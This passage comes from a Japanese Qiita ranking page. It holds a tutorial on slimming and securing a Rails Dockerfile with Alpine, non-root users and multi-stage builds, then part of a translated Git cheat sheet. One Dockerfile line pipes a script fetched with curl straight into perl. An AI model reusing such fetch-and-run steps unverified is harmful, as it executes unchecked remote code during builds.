<div class="highlight"><pre><span></span><span class="k">FROM</span><span class="s"> ruby:2.4.1</span>

〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜同じ〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜

<span class="c"># install dependency package</span>
<span class="k">RUN</span> apt-get update <span class="o">&amp;&amp;</span> <span class="se">\</span>
    apt-get install -y --no-install-recommends apt-transport-https libssl-dev <span class="o">&amp;&amp;</span> <span class="se">\</span>
    apt-get clean <span class="o">&amp;&amp;</span> <span class="se">\</span>
    rm -rf /var/lib/apt/lists/*

<span class="c"># install nodejs</span>
<span class="k">RUN</span> curl -s -L git.io/nodebrew <span class="p">|</span> perl - setup
<span class="k">ENV</span><span class="s"> PATH /root/.nodebrew/current/bin:$PATH</span>
<span class="k">RUN</span> nodebrew install-binary v8.7.0
<span class="k">RUN</span> nodebrew use v8.7.0

<span class="c"># install yarn</span>
<span class="c"># https://yarnpkg.com/en/docs/install#linux-tab</span>
<span class="k">RUN</span> curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg <span class="p">|</span> apt-key add -
<span class="k">RUN</span> <span class="nb">echo</span> <span class="s2">"deb https://dl.yarnpkg.com/debian/ stable main"</span> <span class="p">|</span> tee /etc/apt/sources.list.d/yarn.list
<span class="k">RUN</span> apt-get update <span class="o">&amp;&amp;</span> <span class="se">\</span>
    apt-get install -y --no-install-recommends apt-transport-https yarn <span class="o">&amp;&amp;</span> <span class="se">\</span>
    apt-get clean <span class="o">&amp;&amp;</span> <span class="se">\</span>
    rm -rf /var/lib/apt/lists/*

<span class="k">RUN</span> gem install bundler

〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜同じ〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜

<span class="k">CMD</span><span class="s"> bundle exec puma -t 5:5 -p 3000 -e "$RAILS_ENV" -C config/puma.rb</span>
</pre></div>
</div>

<h3>
<span id="変更点の概要-1" class="fragment"></span><a href="#%E5%A4%89%E6%9B%B4%E7%82%B9%E3%81%AE%E6%A6%82%E8%A6%81-1"><i class="fa fa-link"></i></a>変更点の概要</h3>

<ul>
<li>1.05GB -&gt; 1.03GB</li>
<li>RUN内ではじめに<code>apt-get update</code>、最後に<code>apt-get clean</code>、<code>rm -rf /var/lib/apt/lists/*</code>を行うことでサイズが増えるのを防ぐ</li>
</ul>

<h3>
<span id="base-imageを小さいものに変更する" class="fragment"></span><a href="#base-image%E3%82%92%E5%B0%8F%E3%81%95%E3%81%84%E3%82%82%E3%81%AE%E3%81%AB%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>base imageを小さいものに変更する</h3>

<ul>
<li>alpine(軽量でセキュアなLinuxディストリビューション)を使う</li>
</ul>

<table>
<thead>
<tr>
<th>image</th>
<th>size</th>
</tr>
</thead>
<tbody>
<tr>
<td>ruby:2.4.1</td>
<td>684MB</td>
</tr>
<tr>
<td>ruby:2.4.1-slim</td>
<td>224MB</td>
</tr>
<tr>
<td>ruby:2.4.1-alpine3.6</td>
<td>84.4MB</td>
</tr>
</tbody>
</table>

<div class="code-frame" data-lang="docker">
<div class="code-lang"><span class="bold">Dockerfile.3</span></div>
<div class="highlight"><pre><span></span><span class="k">FROM</span><span class="s"> ruby:2.4.1-alpine3.6</span>

<span class="c"># timezone</span>
<span class="k">RUN</span> apk add --no-cache tzdata <span class="o">&amp;&amp;</span> <span class="se">\</span>
    cp /usr/share/zoneinfo/Asia/Tokyo /etc/localtime <span class="o">&amp;&amp;</span> <span class="se">\</span>
    apk del --purge tzdata

<span class="k">EXPOSE</span><span class="s"> 3000</span>
<span class="k">WORKDIR</span><span class="s"> /home/port/app</span>

<span class="c"># install nodejs</span>
<span class="k">ENV</span><span class="s"> NODE_VERSION 8.7.0</span>
<span class="k">RUN</span> addgroup -g <span class="m">1000</span> node <span class="se">\</span>
    <span class="o">&amp;&amp;</span> adduser -u <span class="m">1000</span> -G node -s /bin/sh -D node <span class="se">\</span>
    <span class="o">&amp;&amp;</span> apk add --no-cache <span class="se">\</span>
        libstdc++ <span class="se">\</span>
    <span class="o">&amp;&amp;</span> apk add --no-cache --virtual .build-deps <span class="se">\</span>
        binutils-gold <span class="se">\</span>
        curl <span class="se">\</span>
        g++ <span class="se">\</span>
        gcc <span class="se">\</span>
        gnupg <span class="se">\</span>
        libgcc <span class="se">\</span>
        linux-headers <span class="se">\</span>
        make <span class="se">\</span>
        python <span class="se">\</span>
  # gpg keys listed at https://github.com/nodejs/node#release-team
  <span class="o">&amp;&amp;</span> <span class="k">for</span> key in <span class="se">\</span>
    9554F04D7259F04124DE6B476D5A82AC7E37093B <span class="se">\</span>
    94AE36675C464D64BAFA68DD7434390BDBE9B9C5 <span class="se">\</span>
    FD3A5288F042B6850C66B31F09FE44734EB7990E <span class="se">\</span>
    71DCFD284A79C3B38668286BC97EC7A07EDE3FC1 <span class="se">\</span>
    DD8F2338BAE7501E3DD5AC78C273792F7D83545D <span class="se">\</span>
    B9AE9905FFD7803F25714661B63B535A4C206CA9 <span class="se">\</span>
    C4F0DFFF4E8C1A8236409D08E73BC641CC11F4C8 <span class="se">\</span>
    56730D5401028683275BD23C23EFEFE93C4CFFFE <span class="se">\</span>
  <span class="p">;</span> <span class="k">do</span> <span class="se">\</span>
    gpg --keyserver pgp.mit.edu --recv-keys <span class="s2">"</span><span class="nv">$key</span><span class="s2">"</span> <span class="o">||</span> <span class="se">\</span>
    gpg --keyserver keyserver.pgp.com --recv-keys <span class="s2">"</span><span class="nv">$key</span><span class="s2">"</span> <span class="o">||</span> <span class="se">\</span>
    gpg --keyserver ha.pool.sks-keyservers.net --recv-keys <span class="s2">"</span><span class="nv">$key</span><span class="s2">"</span> <span class="p">;</span> <span class="se">\</span>
  <span class="k">done</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span> curl -SLO <span class="s2">"https://nodejs.org/dist/v</span><span class="nv">$NODE_VERSION</span><span class="s2">/node-v</span><span class="nv">$NODE_VERSION</span><span class="s2">.tar.xz"</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span> curl -SLO --compressed <span class="s2">"https://nodejs.org/dist/v</span><span class="nv">$NODE_VERSION</span><span class="s2">/SHASUMS256.txt.asc"</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span> gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc <span class="se">\</span>
    <span class="o">&amp;&amp;</span> grep <span class="s2">" node-v</span><span class="nv">$NODE_VERSION</span><span class="s2">.tar.xz\$"</span> SHASUMS256.txt <span class="p">|</span> sha256sum -c - <span class="se">\</span>
    <span class="o">&amp;&amp;</span> tar -xf <span class="s2">"node-v</span><span class="nv">$NODE_VERSION</span><span class="s2">.tar.xz"</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span> <span class="nb">cd</span> <span class="s2">"node-v</span><span class="nv">$NODE_VERSION</span><span class="s2">"</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span> ./configure <span class="se">\</span>
    <span class="o">&amp;&amp;</span> make -j<span class="k">$(</span>getconf _NPROCESSORS_ONLN<span class="k">)</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span> make install <span class="se">\</span>
    <span class="o">&amp;&amp;</span> apk del .build-deps <span class="se">\</span>
    <span class="o">&amp;&amp;</span> <span class="nb">cd</span> .. <span class="se">\</span>
    <span class="o">&amp;&amp;</span> rm -Rf <span class="s2">"node-v</span><span class="nv">$NODE_VERSION</span><span class="s2">"</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span> rm <span class="s2">"node-v</span><span class="nv">$NODE_VERSION</span><span class="s2">.tar.xz"</span> SHASUMS256.txt.asc SHASUMS256.txt

<span class="c"># install yarn</span>
<span class="k">ENV</span><span class="s"> YARN_VERSION 1.2.0</span>
<span class="k">RUN</span> apk add --no-cache --virtual .build-deps-yarn curl gnupg tar <span class="se">\</span>
  <span class="o">&amp;&amp;</span> <span class="k">for</span> key in <span class="se">\</span>
    6A010C5166006599AA17F08146C2130DFD2497F5 <span class="se">\</span>
  <span class="p">;</span> <span class="k">do</span> <span class="se">\</span>
    gpg --keyserver pgp.mit.edu --recv-keys <span class="s2">"</span><span class="nv">$key</span><span class="s2">"</span> <span class="o">||</span> <span class="se">\</span>
    gpg --keyserver keyserver.pgp.com --recv-keys <span class="s2">"</span><span class="nv">$key</span><span class="s2">"</span> <span class="o">||</span> <span class="se">\</span>
    gpg --keyserver ha.pool.sks-keyservers.net --recv-keys <span class="s2">"</span><span class="nv">$key</span><span class="s2">"</span> <span class="p">;</span> <span class="se">\</span>
  <span class="k">done</span> <span class="se">\</span>
  <span class="o">&amp;&amp;</span> curl -fSLO --compressed <span class="s2">"https://yarnpkg.com/downloads/</span><span class="nv">$YARN_VERSION</span><span class="s2">/yarn-v</span><span class="nv">$YARN_VERSION</span><span class="s2">.tar.gz"</span> <span class="se">\</span>
  <span class="o">&amp;&amp;</span> curl -fSLO --compressed <span class="s2">"https://yarnpkg.com/downloads/</span><span class="nv">$YARN_VERSION</span><span class="s2">/yarn-v</span><span class="nv">$YARN_VERSION</span><span class="s2">.tar.gz.asc"</span> <span class="se">\</span>
  <span class="o">&amp;&amp;</span> gpg --batch --verify yarn-v<span class="nv">$YARN_VERSION</span>.tar.gz.asc yarn-v<span class="nv">$YARN_VERSION</span>.tar.gz <span class="se">\</span>
  <span class="o">&amp;&amp;</span> mkdir -p /opt/yarn <span class="se">\</span>
  <span class="o">&amp;&amp;</span> tar -xzf yarn-v<span class="nv">$YARN_VERSION</span>.tar.gz -C /opt/yarn --strip-components<span class="o">=</span><span class="m">1</span> <span class="se">\</span>
  <span class="o">&amp;&amp;</span> ln -s /opt/yarn/bin/yarn /usr/local/bin/yarn <span class="se">\</span>
  <span class="o">&amp;&amp;</span> ln -s /opt/yarn/bin/yarn /usr/local/bin/yarnpkg <span class="se">\</span>
  <span class="o">&amp;&amp;</span> rm yarn-v<span class="nv">$YARN_VERSION</span>.tar.gz.asc yarn-v<span class="nv">$YARN_VERSION</span>.tar.gz <span class="se">\</span>
  <span class="o">&amp;&amp;</span> apk del .build-deps-yarn

<span class="k">RUN</span> gem install bundler

COPY . /home/port/app

<span class="c"># bundle install</span>
<span class="k">RUN</span> apk --no-cache --virtual gem-builddeps add alpine-sdk sqlite-dev <span class="o">&amp;&amp;</span> <span class="se">\</span>
    bundle install --without development <span class="nb">test</span> --path vendor/bundle <span class="o">&amp;&amp;</span> <span class="se">\</span>
    apk del --purge gem-builddeps

<span class="c"># yarn install</span>
<span class="k">RUN</span> yarn install

<span class="c"># assets precompile</span>
<span class="k">RUn</span> apk --no-cache add tzdata sqlite-libs
<span class="k">RUN</span> <span class="nv">RAILS_ENV</span><span class="o">=</span>production bundle <span class="nb">exec</span> rails assets:precompile

<span class="k">CMD</span><span class="s"> bundle exec puma -t 5:5 -p 3000 -e "$RAILS_ENV" -C config/puma.rb</span>
</pre></div>
</div>

<h3>
<span id="変更点の概要-2" class="fragment"></span><a href="#%E5%A4%89%E6%9B%B4%E7%82%B9%E3%81%AE%E6%A6%82%E8%A6%81-2"><i class="fa fa-link"></i></a>変更点の概要</h3>

<ul>
<li>1.05GB -&gt; 405MB</li>
<li>alpineではapkを使って依存パッケージをインストールする</li>
</ul>

<h2>
<span id="railsの実行ユーザがrootになっている問題" class="fragment"></span><a href="#rails%E3%81%AE%E5%AE%9F%E8%A1%8C%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%8Croot%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B%E5%95%8F%E9%A1%8C"><i class="fa fa-link"></i></a>railsの実行ユーザがrootになっている問題</h2>

<h3>
<span id="一般ユーザで動作させる" class="fragment"></span><a href="#%E4%B8%80%E8%88%AC%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%A7%E5%8B%95%E4%BD%9C%E3%81%95%E3%81%9B%E3%82%8B"><i class="fa fa-link"></i></a>一般ユーザで動作させる</h3>

<ul>
<li><a href="https://docs.docker.com/engine/security/security/" rel="nofollow noopener" target="_blank">公式ドキュメント(docker security)</a></li>
</ul>

<div class="code-frame" data-lang="docker">
<div class="code-lang"><span class="bold">Dockerfile.4</span></div>
<div class="highlight"><pre><span></span><span class="k">FROM</span><span class="s"> ruby:2.4.1</span>

<span class="c"># timezone</span>
<span class="k">RUN</span> cp /usr/share/zoneinfo/Asia/Tokyo /etc/localtime

<span class="k">EXPOSE</span><span class="s"> 3000</span>

<span class="c"># create user</span>
<span class="k">RUN</span> useradd port -u <span class="m">3333</span> -d /home/port <span class="o">&amp;&amp;</span> <span class="se">\</span>
    mkdir -p /home/port/app <span class="o">&amp;&amp;</span> <span class="se">\</span>
    chown port.port -R /home/port

<span class="k">WORKDIR</span><span class="s"> /home/port/app</span>

〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜同じ〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜

<span class="c"># assets precompile</span>
<span class="k">RUN</span> <span class="nv">RAILS_ENV</span><span class="o">=</span>production bundle <span class="nb">exec</span> rails assets:precompile

<span class="k">RUN</span> chown port.port log <span class="o">&amp;&amp;</span> <span class="se">\</span>
    chown port.port -R db
USER port

<span class="k">CMD</span><span class="s"> bundle exec puma -t 5:5 -p 3000 -e "$RAILS_ENV" -C config/puma.rb</span>
</pre></div>
</div>

<h3>
<span id="変更点の概要-3" class="fragment"></span><a href="#%E5%A4%89%E6%9B%B4%E7%82%B9%E3%81%AE%E6%A6%82%E8%A6%81-3"><i class="fa fa-link"></i></a>変更点の概要</h3>

<ul>
<li>一般ユーザを作成</li>
<li>最低限権限が必要なディレクトリ・ファイルのオーナーを変更する</li>
<li>
<code>USER</code>で実行ユーザを変更する</li>
</ul>

<h2>
<span id="応用multi-stage-build" class="fragment"></span><a href="#%E5%BF%9C%E7%94%A8multi-stage-build"><i class="fa fa-link"></i></a>(応用)multi stage build</h2>

<ul>
<li>Docker 17.05以降のみ使用可能</li>
<li>imageを小さくするためのテクニック( staticライブラリをビルド後に削除する)により、Dockerfileが複雑になることを防ぐ</li>
<li>公式imageが存在するものは同じディストリビューションのものからビルド済みバイナリをコピーすることが出来る（無くても自分で作成すれば同じことが出来る）</li>
<li><a href="https://docs.docker.com/engine/userguide/eng-image/multistage-build/#before-multi-stage-builds" rel="nofollow noopener" target="_blank">公式ドキュメント(Use multi-stage builds)</a></li>
</ul>

<div class="code-frame" data-lang="docker">
<div class="code-lang"><span class="bold">Dockerfile.5</span></div>
<div class="highlight"><pre><span></span><span class="k">FROM</span><span class="s"> node:8.7.0 as node</span>

<span class="k">FROM</span><span class="s"> ruby:2.4.1</span>

〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜同じ〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜

<span class="c"># install dependency package</span>
<span class="k">RUN</span> apt-get update
<span class="k">RUN</span> apt-get install -y apt-transport-https libssl-dev

<span class="c"># install nodejs yarn</span>
COPY --from<span class="o">=</span>node /usr/local/bin/node /usr/local/bin/node
COPY --from<span class="o">=</span>node /usr/local/include/node /usr/local/include/node
COPY --from<span class="o">=</span>node /usr/local/lib/node_modules /usr/local/lib/node_modules
COPY --from<span class="o">=</span>node /opt/yarn /opt/yarn
<span class="k">RUN</span> ln -s /usr/local/bin/node /usr/local/bin/nodejs <span class="o">&amp;&amp;</span> <span class="se">\</span>
    ln -s /usr/local/lib/node_modules/npm/bin/npm-cli.js /usr/local/bin/npm <span class="o">&amp;&amp;</span> <span class="se">\</span>
    ln -s /opt/yarn/bin/yarn /usr/local/bin/yarn

<span class="k">RUN</span> gem install bundler

COPY . /home/port/app

〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜同じ〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜〜

<span class="k">CMD</span><span class="s"> bundle exec puma -t 5:5 -p 3000 -e "$RAILS_ENV" -C config/puma.rb</span>
</pre></div>
</div>

<h3>
<span id="変更点の概要-4" class="fragment"></span><a href="#%E5%A4%89%E6%9B%B4%E7%82%B9%E3%81%AE%E6%A6%82%E8%A6%81-4"><i class="fa fa-link"></i></a>変更点の概要</h3>

<ul>
<li>
<code>FROM node:8.7.0 as XXXX</code>でコピー元のimageを指定

<ul>
<li>コピー元のimageのディストリビューションをコピー先のものと一致させる

<ul>
<li>
<a href="https://hub.docker.com/_/ruby/" class="autolink" rel="nofollow noopener" target="_blank">https://hub.docker.com/_/ruby/</a>

<ul>
<li><a href="https://github.com/docker-library/ruby/blob/135c84979b1401a6963e75f3c95161bfe5be2336/2.4/jessie/Dockerfile" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/docker-library/ruby/blob/135c84979b1401a6963e75f3c95161bfe5be2336/2.4/jessie/Dockerfile</a></li>
</ul>
</li>
<li>
<a href="https://hub.docker.com/_/node/" class="autolink" rel="nofollow noopener" target="_blank">https://hub.docker.com/_/node/</a>

<ul>
<li><a href="https://github.com/nodejs/docker-node/blob/15d780e932fc8cd4a145a36cff405610c8c71b0c/8.7/Dockerfile" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/nodejs/docker-node/blob/15d780e932fc8cd4a145a36cff405610c8c71b0c/8.7/Dockerfile</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<code>COPY --from=XXXX</code>で必要なファイル（今回はnodeとyarn）をコピーする</li>
</ul>

<h2>
<span id="全てのテクニックを適用したdockerfile" class="fragment"></span><a href="#%E5%85%A8%E3%81%A6%E3%81%AE%E3%83%86%E3%82%AF%E3%83%8B%E3%83%83%E3%82%AF%E3%82%92%E9%81%A9%E7%94%A8%E3%81%97%E3%81%9Fdockerfile"><i class="fa fa-link"></i></a>全てのテクニックを適用したDockerfile</h2>

<div class="code-frame" data-lang="docker">
<div class="code-lang"><span class="bold">Dockerfile.6</span></div>
<div class="highlight"><pre><span></span><span class="k">FROM</span><span class="s"> node:8.7.0-alpine as node</span>

<span class="k">FROM</span><span class="s"> ruby:2.4.1-alpine3.6</span>

<span class="c"># timezone</span>
<span class="k">RUN</span> apk add --no-cache tzdata <span class="o">&amp;&amp;</span> <span class="se">\</span>
    cp /usr/share/zoneinfo/Asia/Tokyo /etc/localtime <span class="o">&amp;&amp;</span> <span class="se">\</span>
    apk del --purge tzdata

<span class="k">EXPOSE</span><span class="s"> 3000</span>

<span class="c"># user</span>
<span class="k">RUN</span> apk --no-cache add shadow
<span class="k">RUN</span> useradd port -u <span class="m">3333</span> -d /home/port <span class="o">&amp;&amp;</span> <span class="se">\</span>
    mkdir -p /home/port/app <span class="o">&amp;&amp;</span> <span class="se">\</span>
    chown port.port -R /home/port

<span class="k">WORKDIR</span><span class="s"> /home/port/app</span>

<span class="c"># install nodejs yarn</span>
COPY --from<span class="o">=</span>node /usr/local/bin/node /usr/local/bin/node
COPY --from<span class="o">=</span>node /usr/local/include/node /usr/local/include/node
COPY --from<span class="o">=</span>node /usr/local/lib/node_modules /usr/local/lib/node_modules
COPY --from<span class="o">=</span>node /opt/yarn /opt/yarn
<span class="k">RUN</span> ln -s /usr/local/bin/node /usr/local/bin/nodejs <span class="o">&amp;&amp;</span> <span class="se">\</span>
    ln -s /usr/local/lib/node_modules/npm/bin/npm-cli.js /usr/local/bin/npm <span class="o">&amp;&amp;</span> <span class="se">\</span>
    ln -s /opt/yarn/bin/yarn /usr/local/bin/yarn

<span class="k">RUN</span> gem install bundler

<span class="c"># install dependency package</span>
<span class="k">RUN</span> apk --no-cache add tzdata sqlite-libs libstdc++

<span class="c"># bundle install</span>
COPY Gemfile Gemfile.lock ./
<span class="k">RUN</span> apk --no-cache --virtual gem-builddeps add alpine-sdk sqlite-dev <span class="o">&amp;&amp;</span> <span class="se">\</span>
    bundle install --without development <span class="nb">test</span> --path vendor/bundle <span class="o">&amp;&amp;</span> <span class="se">\</span>
    apk del --purge gem-builddeps

<span class="c"># yarn install</span>
COPY package.json yarn.lock .postcssrc.yml ./
<span class="k">RUN</span> yarn install

<span class="c"># assets precompile</span>
COPY Rakefile .babelrc ./
COPY config config
COPY app/assets app/assets
COPY app/javascript app/javascript
COPY bin bin
<span class="k">RUN</span> <span class="nv">RAILS_ENV</span><span class="o">=</span>production bundle <span class="nb">exec</span> rails assets:precompile

COPY . /home/port/app

<span class="k">RUN</span> chown port.port log <span class="o">&amp;&amp;</span> <span class="se">\</span>
    chown port.port -R db
USER port

<span class="k">CMD</span><span class="s"> bundle exec puma -t 5:5 -p 3000 -e "$RAILS_ENV" -C config/puma.rb</span>
</pre></div>
</div>

<h1>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h1>

<ul>
<li>Dockerfileはある程度複雑になってしまう</li>
<li>理由

<ul>
<li>キャッシュを有効に活用しbuildの時間を短縮するため</li>
<li>実行時に不要なstaticライブラリをimage内に残さないため</li>
<li>一般ユーザで実行するため</li>
</ul>
</li>
</ul>

<h1>
<span id="参考" class="fragment"></span><a href="#%E5%8F%82%E8%80%83"><i class="fa fa-link"></i></a>参考</h1>

<ul>
<li><a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/" rel="nofollow noopener" target="_blank">公式ドキュメント(Best practices for writing Dockerfiles)</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">39位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>245</kbd>
		<a target="_blank" href="https://qiita.com/okamu_/items/d52a6900311ad9073628">(翻訳)【GitHub公式】Gitコマンドチートシート</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-25<br />08:36:10</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/62822.html">okamu_</a>(53件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/62822/profile-images/1491391263">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Git]</b> <b>[GitHub]</b> <b>[翻訳]</b> <b>[新人プログラマ応援]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>githubが公式にgitコマンドのチートシートというのを出していたので、それを日本語に翻訳しました。</p>

<p><a href="https://camo.qiitausercontent.com/0850e8916c4fb2393681eef1757ed618221b513e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36323832322f35383839623036372d316261662d623235382d626638302d3534656231656565313935332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/0850e8916c4fb2393681eef1757ed618221b513e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36323832322f35383839623036372d316261662d623235382d626638302d3534656231656565313935332e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/62822/5889b067-1baf-b258-bf80-54eb1eee1953.png"></a></p>

<p>gitとはオープンソースの分散バージョン管理システムで、ラップトップやデスクトップ上での活動を促進します。<br>
このチートシートは簡単なGitのコマンドラインを参照できるようになっています。</p>

<h2>
<span id="gitをインストールする" class="fragment"></span><a href="#git%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>GITをインストールする</h2>

<p>GitHubは、最も一般的なリポジトリアクション用のグラフィカルユーザーインターフェイスを含むデスクトップクライアントと、高度なシナリオ用のGitコマンドラインエディションが用意されています。</p>

<h3>
<span id="github-for-windows" class="fragment"></span><a href="#github-for-windows"><i class="fa fa-link"></i></a>GitHub for Windows</h3>

<p><a href="https://windows.github.com" class="autolink" rel="nofollow noopener" target="_blank">https://windows.github.com</a> </p>

<h3>
<span id="mac用github" class="fragment"></span><a href="#mac%E7%94%A8github"><i class="fa fa-link"></i></a>Mac用GitHub</h3>

<p><a href="https://mac.github.com" class="autolink" rel="nofollow noopener" target="_blank">https://mac.github.com</a></p>

<p>Linux用GitディストリビューションPOSIXシステムは公式のGit SCM webサイトで利用可能です</p>

<p>Git for All Platforms<br>
<a href="http://git-scm.com" class="autolink" rel="nofollow noopener" target="_blank">http://git-scm.com</a></p>

<h2>
<span id="gitの初期設定" class="fragment"></span><a href="#git%E3%81%AE%E5%88%9D%E6%9C%9F%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>gitの初期設定</h2>

<p>ローカルリポジトリのユーザ情報を設定します</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ git config　--global user.name "[name]"
コミットトランザクションに付ける名前を設定します。

$ git config --global user.email "[email address]"
コミットトランザクションに添付したい電子メールを設定します。

$ git config --global color.ui auto
コマンドライン出力の時にいい感じで色付けします。
</pre></div></div>

<h2>
<span id="リポジトリを作る" class="fragment"></span><a href="#%E3%83%AA%E3%83%9D%E3%82%B8%E3%83%88%E3%83%AA%E3%82%92%E4%BD%9C%E3%82%8B"><i class="fa fa-link"></i></a>リポジトリを作る</h2>

<p>新しいリポジトリを作成するか、既存のURLからリポジトリを取得します。 </p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ git init "[project-name]"
指定された名前を持つ新しいローカルリポジトリを作成する

$ git clone "[url]"
projectとそのバージョン履歴全体をダウンロードする
</pre></div></div>

<h2>
<span id="コミットを作成する" class="fragment"></span><a href="#%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>コミットを作成する</h2>

<p>編集内容を確認してコミットします。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ git status
コミットするすべての新規または変更されたファイルを一覧表示する

$ git diff
まだステージングされていないファイルの違いを表示する

$ git add "[file]"
バージョン管理のためにファイルをスナップショットする(ステージにあげる)

$ git diff --staged 
ステージとの差分を表示する

$ git reset "[file]"
ファイルをアンステージしますが、内容は保存します

$ git commit -m "[コミットメッセージ]"
ステージに上がっているファイルをコミットメッセージとともに記録します
</pre></div></div>

<h2>
<span id="ブランチ操作" class="fragment"></span><a href="#%E3%83%96%E3%83%A9%E3%83%B3%E3%83%81%E6%93%8D%E4%BD%9C"><i class="fa fa-link"></i></a>ブランチ操作</h2>

<p>一連のコミットをブランチとして切り分ける事ができます</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ git branch "[branch-name]"
新しいブランチを作成する

$ git checkout "[branch-name]"
指定されたブランチに切り替えて作業ディレクトリを更新する 

$ git merge "[branch]"
指定されたブランチを結合し、作業ディレクトリを更新します。

$ git branch -d "[branch-name]"
指定されたブランチを削除します。

</pre></div></div>

<h2>
<span id="ファイルのリファクタリング" class="fragment"></span><a href="#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%83%AA%E3%83%95%E3%82%A1%E3%82%AF%E3%82%BF%E3%83%AA%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>ファイルのリファクタリング</h2>

<p>バージョン管理されたファイルの再配置と削除</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ git rm "[file]"
作業ディレクトリからファイルを削除し、削除をステージングします

$ git rm --cached "[file]"
バージョン管理からファイルを削除しますが、ファイルをローカルに保存します

$ git mv "[file-original]" "[file-renamed]"
ファイル名を変更し、コミットの準備をします
</pre></div></div>

<h2>
<span id="トラッキング" class="fragment"></span><a href="#%E3%83%88%E3%83%A9%E3%83%83%E3%82%AD%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>トラッキング</h2>

<p>一時ファイルとパスを除外する</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>.gitignoreで指定されたパターンに一致するファイルはgit管理しないようになります

*.log
build/
temp-*

$ git ls-files --other --ignored --exclude-standard
このプロジェクトのすべてで、無視されたファイルを一覧を表示します
</pre></div></div>

<h2>
<span id="一時的に作業ファイルを保存する" class="fragment"></span><a href="#%E4%B8%80%E6%99%82%E7%9A%84%E3%81%AB%E4%BD%9C%E6%A5%AD%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E4%BF%9D%E5%AD%98%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>一時的に作業ファイルを保存する</h2>

<p>不完全な変更を保存したり復元できます</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ git stash
変更されたすべてのファイルを一時的に保存する

$ git stash pop
最新の一時保存したファイルを復元する

$ git stash list 
一時保存したすべてのファイル一覧を表示する

$ git stash drop
最後に一時保存したファイルを削除する
</pre></div></div>

<h2>
<span id="gitの履歴" class="fragment"></span><a href="#git%E3%81%AE%E5%B1%A5%E6%AD%B4"><i class="fa fa-link"></i></a>gitの履歴</h2>

<p>プロジェクトファイルの履歴を確認します</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ git log
現在のgitの履歴を一覧表示する

$ git log --follow "[file]"
ファイルのバージョン履歴をリネームも含めて表示する



$ git diff "[first-branch]...[second-branch]"
2つのブランチ間の差分を表示します

$ git show "[commit id]"
指定されたコミットのメタデータとコンテンツの変更を出力します。
</pre></div></div>

<h2>
<span id="やり直し" class="fragment"></span><a href="#%E3%82%84%E3%82%8A%E7%9B%B4%E3%81%97"><i class="fa fa-link"></i></a>やり直し</h2>

<p>間違ったcommit履歴へ戻る</p>

